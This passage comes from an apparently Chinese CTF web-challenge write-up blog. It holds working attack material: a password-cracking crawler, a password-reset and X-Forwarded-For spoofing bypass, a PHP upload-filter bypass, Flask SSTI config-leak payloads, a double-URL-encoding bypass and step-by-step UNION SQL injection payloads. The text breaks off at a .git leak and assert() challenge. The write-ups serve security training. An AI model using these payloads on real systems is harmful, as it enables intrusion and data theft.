class="comment"># 下载pdf文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloadFile</span>(<span class="params">urlList</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">&quot;pdf&quot;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;pdf&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;./pdf&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urlList:</span><br><span class="line">        os.system(<span class="string">&quot;curl -O &quot;</span> + url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为txt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pdf2Text</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="comment"># 打开PDF文件</span></span><br><span class="line">    pdfFile = <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    <span class="comment"># 创建pdf文档分析器</span></span><br><span class="line">    parser = PDFParser(pdfFile)</span><br><span class="line">    <span class="comment"># 创建PDF文档对象存储文档结构</span></span><br><span class="line">    document = PDFDocument(parser)</span><br><span class="line">    <span class="comment"># 检查文件是否允许文本提取</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> document.is_extractable:</span><br><span class="line">        <span class="keyword">raise</span> PDFTextExtractionNotAllowed</span><br><span class="line">    <span class="comment"># 创建PDF资源管理器对象来存储共享资源</span></span><br><span class="line">    resource = PDFResourceManager()</span><br><span class="line">    <span class="comment"># 设定参数进行分析</span></span><br><span class="line">    laparams = LAParams()</span><br><span class="line">    <span class="comment"># 创建一个PDF设备对象</span></span><br><span class="line">    device = PDFPageAggregator(resource, laparams=laparams)</span><br><span class="line">    <span class="comment"># 创建一个PDF解释器对象</span></span><br><span class="line">    interpreter = PDFPageInterpreter(resource, device)</span><br><span class="line">    <span class="comment"># 创建存储转换结果的同名txt文件</span></span><br><span class="line">    fileName = <span class="built_in">str</span>(os.path.abspath(path).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    newFileName = fileName + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(newFileName, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="comment"># 处理每一页</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.create_pages(document):</span><br><span class="line">        interpreter.process_page(page)</span><br><span class="line">        <span class="comment"># 接受该页面的LTPage对象</span></span><br><span class="line">        layout = device.get_result()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isinstance</span>(x, LTTextBoxHorizontal)):</span><br><span class="line">                <span class="comment"># 写入txt文件</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f.writelines(x.get_text() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐个单词进行散列运算并查找匹配</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findPassword</span>(<span class="params">path</span>):</span><br><span class="line">    ls = [<span class="string">&quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;</span>, <span class="string">&quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;</span>, <span class="string">&quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;</span>]</span><br><span class="line">    wordList = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            i = i.strip()</span><br><span class="line">            lineWordList = <span class="built_in">list</span>(i.split())</span><br><span class="line">            wordList += lineWordList</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> wordList:</span><br><span class="line">        i = i.strip(<span class="string">&quot;:&quot;</span>).strip(<span class="string">&quot;;&quot;</span>).strip(<span class="string">&quot;.&quot;</span>).strip(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">        en = sha1()</span><br><span class="line">        en.update((i + <span class="string">&quot;Salz!&quot;</span>).encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        result = en.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> result <span class="keyword">in</span> ls:</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&quot;\t&quot;</span>, result)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://220.249.52.133:30445/&quot;</span></span><br><span class="line">    pdfUrlList = []</span><br><span class="line">    findPDF(url)</span><br><span class="line">    <span class="built_in">print</span>(pdfUrlList)</span><br><span class="line">    downloadFile(pdfUrlList)</span><br><span class="line">    pdfPathList = []</span><br><span class="line">    <span class="built_in">print</span>(os.getcwd())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;.\\pdf\\&quot;</span>):</span><br><span class="line">        pdfPathList.append(<span class="string">&quot;.\\pdf\\&quot;</span> + i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdfPathList:</span><br><span class="line">        Pdf2Text(i)</span><br><span class="line">        textFile = i[<span class="number">0</span>:-<span class="number">3</span>] + <span class="string">&quot;txt&quot;</span></span><br><span class="line">        findPassword(textFile)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;File：&quot;</span> + textFile)</span><br></pre></td></tr></table></figure>

<p>运行脚本，当碰到正确的密码时自动终止</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395582.png" alt="1604316948660.png"></p>
<p>根据散列值得知是fritze账户，admin.php页面输入得到Flag：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395590.png" alt="1604316853076.png"></p>
<p>检索30多个PDF来找到密码，只能说大佬们的路子真的野~😌</p>
<h2 id="⭐-bug（任意用户密码重置-XFF伪造-文件上传）"><a href="#⭐-bug（任意用户密码重置-XFF伪造-文件上传）" class="headerlink" title="⭐ bug（任意用户密码重置+XFF伪造+文件上传）"></a>⭐ bug（任意用户密码重置+XFF伪造+文件上传）</h2><p>[redinfo title&#x3D;”题目信息”]来源： RCTF-2015<br>难度：5星<br>考察：逻辑漏洞（任意用户密码重置）、参数猜测、XFF IP伪造、文件上传绕过（后缀解析、MIME、PHP脚本限制）[&#x2F;redinfo]</p>
<p>比较发散，题目环境有以下功能点：登陆前（登录、注册、找回密码），登录后（管理、修改密码、个人信息、退出），管理界面需要admin权限</p>
<p>注册了一个aaa的用户，对登录、注册等功能SQL注入无果，但是在请求头的Cookie中有一个user的字段，对其值做MD5解密发现是<strong>5:aaa</strong>，其中5是aaade uid，尝试将user值改为admin相关的MD5散列进行越权，依然失败。</p>
<p>在找回密码处发现，当身份验证成功时，重置密码会在数据包中同时传入用户名和新密码，所以怀疑是重置密码相关的逻辑漏洞。</p>
<p>将用户名改为admin，成功修改admin的密码</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323687.png" alt="1604505334269.png"></p>
<p>登录admin账户查看manage界面，提示IP不允许，上ModHeader，老朋友了，将<strong>XFF修改为127.0.0.1</strong>，成功绕过IP校验</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323694.png" alt="1604505774592.png"></p>
<p>查看页面源码，发现提示：<code>&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</code>，需要猜测do参数，是对文件进行管理，无非就是：<strong>download</strong>、<strong>upload</strong>、<strong>delete</strong>、<strong>read</strong>、<strong>write</strong>、<strong>move</strong>、<strong>copy</strong>，逐个试一下发现此处参数是upload，触发文件上传题目</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323701.png" alt="1604506183072.png"></p>
<p>经过不断上传尝试，发现系统会做文件后缀检测、MIME检测、PHP脚本文件检测（检测&lt;?php），但是又需要上传一个php木马，所以要同时绕过这三个检测。</p>
<p>当使用php5绕过后缀检测、修改MIME为image&#x2F;png后，在php脚本文件监测处，当存在<code>&lt;?php</code>时提示<code>Something shows it is a php!</code>，当在？和php之间加一个空格<code>&lt;? php</code>时又提示<code>It is not a really php file</code></p>
<p>这就表明，不能够使用这种php脚本的写法，后台会检测到，题目考差的是php脚本的第二种写法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将payload改为第二种写法，得到flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323709.png" alt="1604506924276.png"></p>
<h2 id="⭐-shrine（SSTI-url-for-沙盒逃逸）"><a href="#⭐-shrine（SSTI-url-for-沙盒逃逸）" class="headerlink" title="⭐ shrine（SSTI+url_for()沙盒逃逸）"></a>⭐ shrine（SSTI+url_for()沙盒逃逸）</h2><p>题目给出了源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>shrine路径可成功进行SSTI</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332217.png" alt="1604051748466.png"></p>
<p>第5行使用<code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code>添加了一个全局配置，猜测就是flag</p>
<p>但是在12行定义了<code>safe_jinja()</code>来进行安全校验：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">	s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br></pre></td></tr></table></figure>

<p>首先删除()，然后定义黑名单，将config和self替换为None。</p>
<p>这道题如果没有过滤的话，可以直接**<code>&#123;&#123;config&#125;&#125;</code><strong>或</strong><code>&#123;&#123;self.__dict__&#125;&#125;</code>**，经查阅，除此之外还有其他的函数方法可以使用：</p>
<ul>
<li><p><strong>url_for()</strong><br><em>一般我们通过一个URL就可以执行到某一个函数。如果反过来，我们知道一个函数，怎么去获得这个URL呢？url_for函数就可以帮我们实现这个功能。url_for()函数接收两个及以上的参数，他接收函数名作为第一个参数，接收对应URL规则的命名参数，如果还出现其他的参数，则会添加到URL的后面作为查询参数。</em></p>
</li>
<li><p><strong>get_flashed_messages()</strong><br><em>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</em></p>
</li>
</ul>
<p>具体可参考：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/houyanhua1/article/details/85470175">https://blog.csdn.net/houyanhua1/article/details/85470175</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/shuibuzhaodeshiren/article/details/86819537">https://blog.csdn.net/shuibuzhaodeshiren/article/details/86819537</a></p>
<p>首先利用url_for查看当前所有全局变量字典，发现了Flask</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332233.png" alt="1604053909419(1).png"></p>
<p>所以payload如下，即可得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&quot;current_app&quot;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332244.png" alt="1604054046849 (1).png"></p>
<p> get_flashed_messages的payload是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&quot;current_app&quot;].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/83036927">https://blog.csdn.net/qq_33020901&#x2F;article&#x2F;details&#x2F;83036927</a></p>
<h2 id="⭐-Web2（程序逆向）"><a href="#⭐-Web2（程序逆向）" class="headerlink" title="⭐ Web2（程序逆向）"></a>⭐ Web2（程序逆向）</h2><p>出自NSCTF，题目页面给出了一段代码，如下：</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
</code></pre>
<p>要求是逆向加密算法，解密$miwen就是flag，进行<strong>代码审计</strong>吧</p>
<p>程序其实就是自定义一个加密函数encode()，按步骤分析结果如下：</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>); <span class="comment">// 将$str反转（逆序）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;  <span class="comment">// 遍历</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>); <span class="comment">// $_c 等同于 $_o[$_0]</span></span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;  <span class="comment">// $__ 等于 $_c的ascii值加1</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);  <span class="comment">// 再将 $__ 转为ascii字符</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   <span class="comment">// 字符串拼接</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">    <span class="comment">// 先base64编码、再逆序，再进行ROT13 编码（所有字母按照字母表向前移动13位）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
<p>有几个函数拿出来记录一下：</p>
<ul>
<li>strrev(str)：对字符串执行逆序操作，如str&#x3D;abcd，执行后为dcba</li>
<li>substr(str, a, n)：在字符串str中，从下标为a开始截取，共截取n个字符（不指定n则截取到末尾）。题目中n为1，a又是不断递增，所以和啊a[i]这种没有区别</li>
<li>ord(s)：返回字符s的ascii码</li>
<li>chr(n)：返回数字n对应的asscii字符</li>
<li>str_rot13(str)：字符串str中所有字母按照字母表向前移动13位（还原就是再执行一次该函数）</li>
</ul>
<p>知道了加密流程，解密就从后往前依次反向操作就OK了，直接用php写吧，代码如下：</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$_o</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$str</span>)));</span><br><span class="line">    <span class="variable">$_</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$_0</span> = <span class="number">0</span>; <span class="variable">$_0</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>); <span class="variable">$_0</span>++)&#123;</span><br><span class="line">        <span class="variable">$_c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>, <span class="variable">$_0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>) - <span class="number">1</span>;  <span class="comment">// 解密减1</span></span><br><span class="line">        <span class="variable">$_c</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span> = <span class="variable">$_</span> . <span class="variable">$_c</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="variable">$_</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
<p>传入密文，执行即可得到flag<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/12/1602477623.png" alt="1602774229504.png"></p>
<h2 id="⭐-PHP2（phps源码泄漏-URLencode绕过）"><a href="#⭐-PHP2（phps源码泄漏-URLencode绕过）" class="headerlink" title="⭐ PHP2（phps源码泄漏+URLencode绕过）"></a>⭐ PHP2（phps源码泄漏+URLencode绕过）</h2><p>题目首页：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331731.png" alt="1602926244643.png"></p>
<p>尝试直接在url后边加id&#x3D;1……来猜测，但是无果。经师傅们的博文提示，得知寻在index.php文件，但是访问该文件没有反应。</p>
<p>OK，尝试访问index.phps（.phps后缀为php文件的源码文件，用于在网页查看php源码，因为php会被解析执行），得到页面源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>进行简单的审计</strong></p>
<p>GET方式传入id参数，对id有两个if判断语句：</p>
<ul>
<li>第一个：强等于判断id是否为admin，若是则终止程序</li>
<li>第二个：弱等于判断id是否为admin，若是则输出flag</li>
</ul>
<p>其中，第一个和第二个if判断之间进行了一次主动url解码操作。</p>
<p>起初以为是php弱类型相关题目，所以传入了id&#x3D;0，但是不正确，于是采用另一种。</p>
<p>根据源码，需要在传入id时绕过第一次的等于admin判断，即第一次admin判断为false，然后经过urldecode后，再次判断admin为true。但是由于浏览器有一次url自解码操作，所以需要进行两次url编码。</p>
<p>使用Burp对admin做url二次编码：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331747.png" alt="1602927131742.png"></p>
<p>传入id，得到flag：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331756.png" alt="1602927173038.png"></p>
<h2 id="⭐-NewsCenter（常规SQL注入）"><a href="#⭐-NewsCenter（常规SQL注入）" class="headerlink" title="⭐ NewsCenter（常规SQL注入）"></a>⭐ NewsCenter（常规SQL注入）</h2><p>一道SQL注入题目，很基础的POST字符型注入，首先fuzz以下得到可解析符号，最终得到使用以下payload可成功解析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>

<p>没有任何过滤，因此按照常规手工注入步骤依次执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; order by 3 #</span><br><span class="line">-1&#x27; union select 1,2,3 #</span><br><span class="line">-1&#x27; union select 1,2,table_name from information_schema.tables where table_schema=&quot;news&quot; #</span><br><span class="line">-1&#x27; union select 1,2,column_name from information_schema.columns where table_name=&quot;secret_table&quot; #</span><br><span class="line">-1&#x27; union select 1,2,fl4g from secret_table #</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331798.png" alt="1602939552256.png"></p>
<p>也可以sqlmap进行工具注入。</p>
<h2 id="⭐-mfw（-git源码泄露-assert-命令执行）"><a href="#⭐-mfw（-git源码泄露-assert-命令执行）" class="headerlink" title="⭐ mfw（.git源码泄露+assert()命令执行）"></a>⭐ mfw（.git源码泄露+assert()命令执行）</h2><p>网站使用page参数进行文件包含，尝试直接包含passwd文件结果有过滤，About页面有提示用了Git、php和bootstrap</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331832.png" alt="1604045680816.png"></p>
<p>使用Git就应该想到**.git源码泄漏**，Dirb跑一下果然存在.git目录，使用工具GitHack恢复git历史文件，恢复的原理是：</p>
<p>解析 <code>.git/index</code> 文件，并找到工程中所有的文件名和文件 sha1，然后去 <code>.git/objects/</code> 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码。具体可参考下面的文章：</p>
<ul>
<li>git源码泄露总结：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36869808/article/details/88909961"><strong>https://blog.csdn.net/qq_36869808&#x2F;article&#x2F;details&#x2F;88909961</strong></a></li>
</ul>
<p>使用GitHack恢复出以下文件，但是flag没有直接给出，考虑其他办法</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331970.png" alt="1604048674270（1）.png"></p>
<p>在index.php中发现了过滤代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ 